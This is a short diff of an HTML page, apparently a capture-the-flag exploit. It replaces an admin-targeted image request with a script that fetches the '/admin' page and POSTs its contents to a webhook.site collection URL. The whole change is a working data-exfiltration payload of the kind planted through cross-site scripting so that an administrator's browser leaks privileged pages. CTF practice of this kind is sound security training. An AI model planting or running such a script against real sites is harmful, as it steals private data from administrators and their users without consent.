@@ -1,9 +1,15 @@
 <!DOCTYPE html>
 <html>
 <body>
-<h1>Hi Admin</h1>
-
-<img src="http://chall-ctf.ara-its.id:9090/myaccount/resource/bini1.png?id=admin">
-
+<script>
+fetch('/admin')
+  .then(r => r.text())
+  .then(d => {
+    fetch('https://webhook.site/XXXX', {
+      method: 'POST',
+      body: d
+    })
+  })
+</script>
 </body>
 </html>
